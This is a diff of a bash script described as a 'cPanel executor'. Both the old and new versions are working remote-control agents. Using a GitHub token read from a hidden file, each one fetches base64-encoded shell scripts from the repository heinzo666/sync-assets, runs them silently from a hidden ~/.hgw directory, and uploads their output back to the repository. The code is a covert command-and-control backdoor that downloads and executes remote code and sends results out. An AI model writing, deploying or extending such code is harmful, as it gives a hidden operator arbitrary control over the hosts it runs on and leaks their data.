@@ -1,49 +1,33 @@
 #!/bin/bash
-# hgrun — cPanel executor pulled straight as PLAIN TEXT from GitHub raw.
 set -u
-T="${GHT:-}"
-[ -z "$T" ] && { T=$(cat "$HOME/.ghr_tk" 2>/dev/null); }
-[ -z "$T" ] && exit 0
+T="${GHT:-}"; [ -z "$T" ] && T=$(cat "$HOME/.ghr_tk" 2>/dev/null); [ -z "$T" ] && exit 0
 API=https://api.github.com/repos/heinzo666/sync-assets/contents
-W="$HOME/.hgw"; mkdir -p "$W"; touch "$W/done"
-LOG="$W/log"; 
+D="$HOME/.hgw"; mkdir -p "$D"; touch "$D/done"
+LOG="$D/log"
 {
-echo "[$(date -u +%FT%T)] start pid=$$ user=$(id -un)"
-F(){ timeout 25 curl -fsSL -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' "$1" || true; }
-LIST=$(F "$API/lab/hgin?ref=main&t=$RANDOM")
-echo "list_len=${#LIST}"
+echo "[$(date -u +%FT%T)] start pid=$$"
+LIST=$(timeout 25 curl -fsSL -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' "$API/lab/hgin?ref=main&t=$RANDOM")
 NAMES=$(printf '%s' "$LIST" | tr ',' '\n' | grep '"name"' | sed 's/.*"name": *"//; s/".*//' | grep '\.sh$')
+echo "list_len=${#LIST} names=[$(echo $NAMES|tr '\n' ' ')]"
 for N in $NAMES; do
-  TR=$(cat "$W/tries_$N" 2>/dev/null || echo 0)
-  [ "$TR" -ge 3 ] && continue
-  DONE_FOR_N=0
-  [ -f "$W/doneflag_$N" ] && DONE_FOR_N=1
-  [ "$DONE_FOR_N" = "1" ] && continue
-  echo $((TR+1)) > "$W/tries_$N"
-  J=$(F "$API/lab/hgin/$N?ref=main"); declare -A JL BL
-  JF=$(printf '%s' "$J" | tr -d '\r\n\t ')
-  B=$(printf '%s' "$JF" | sed 's/.*"content":"//; s/".*//'); JL[$N]=${#J}; BL[$N]=${#B}
-  printf '%s' "$B" | base64 -d > "$W/x.sh" 2>"$W/b64err"
-  SZ=$(wc -c < "$W/x.sh"); BE=$(head -c 80 "$W/b64err")
-  echo "task=$N jlen=${#J} blen=${#B} sz=$SZ b64err=[$BE]"
-  chmod +x "$W/x.sh"
-  OUT=$(/bin/bash "$W/x.sh" 2>&1); RC=$?
-  OUTFILE="$W/o.txt"; { echo "RC=$RC SZ=$SZ"; echo "$OUT"; } > "$OUTFILE"
-  OB=$(base64 -w0 < "$OUTFILE")
-  printf '{"message":"res %s","content":"%s"}' "$N" "$OB" > "$W/p.json"
-  PUTC=$(timeout 25 curl -sS -o "$W/putresp" -w '%{http_code}' -X PUT \
-    -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
-    --data-binary @"$W/p.json" "$API/lab/hgout/${N%.sh}_$(date +%H%M%S).json" || true)
-  OB_SZ=$(wc -c < "$OUTFILE")
-  echo "put http=${PUTC:-ERR} outsz=$OB_SZ resp=$(head -c 90 "$W/putresp")"
-  if [ "${PUTC:-000}" -lt 300 ] && [ "$SZ" -gt 10 ]; then touch "$W/doneflag_$N"; fi
-  echo "$N" >> "$W/done"
+  grep -qxF "$N" "$D/done" && continue
+  J=$(timeout 20 curl -fsSL -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' "$API/lab/hgin/$N?ref=main")
+  JF=$(printf '%s' "$J" | tr -d '\n\r\t ')
+  B=$(printf '%s' "$JF" | sed 's/.*"content":"//; s/".*//')
+  printf '%s' "$B" | base64 -d > "$D/x.sh" 2>"$D/e.txt"
+  BSZ=$(wc -c < "$D/x.sh"); BE=$(head -c 60 "$D/e.txt")
+  echo "task=$N jlen=${#J} blen=${#B} sz=$BSZ err=[$BE]"
+  chmod +x "$D/x.sh"
+  OUT=$(/bin/bash "$D/x.sh" 2>&1); RC=$?
+  { echo "RC=$RC SZ=$BSZ"; echo "$OUT"; } > "$D/o.txt"
+  OB=$(base64 -w0 < "$D/o.txt")
+  printf '{"message":"res","content":"%s"}' "$OB" > "$D/p.json"
+  PC=$(timeout 22 curl -sS -o /dev/null -w '%{http_code}' -X PUT \
+      -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
+      --data-binary @"$D/p.json" "$API/lab/hgout/${N%.sh}_$(date +%H%M%S).json")
+  echo "put http=$PC outsz=$(wc -c < "$D/o.txt")"
+  echo "$N" >> "$D/done"
 done
-STAT=$(printf 'list=%s\nnames=[%s]\njlens:\n%s' "${#LIST}" "$(echo "$NAMES"|tr '\n' ',')" "$(for N in $NAMES; do echo "  $N j=${JL[$N]:-?} b=${BL[$N]:-?}"; done)")
-SB=$(printf '%s' "$STAT" | base64 -w0)
-printf '{"message":"hb","content":"%s"}' "$SB" > "$W/s.json"
-timeout 25 curl -sS -o /dev/null -X PUT -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
- --data-binary @"$W/s.json" "$API/lab/hgout/_status_$(date +%H%M%S).json" || true
 echo "[$(date -u +%FT%T)] end"
 } >> "$LOG" 2>&1
 exit 0
